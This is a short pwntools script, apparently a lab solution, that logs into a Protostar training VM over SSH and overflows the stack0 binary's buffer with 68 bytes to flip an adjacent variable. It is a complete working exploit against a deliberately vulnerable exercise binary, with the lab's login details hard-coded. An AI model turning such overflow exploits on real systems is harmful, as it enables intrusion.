from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

# modified is adjecent to the buffer, overflowing it by 4 bytes will do the trick
bash.sendline('python -c "print \'A\'*68" | /opt/protostar/bin/stack0')
print('you have' in bash.recvline(1024).decode())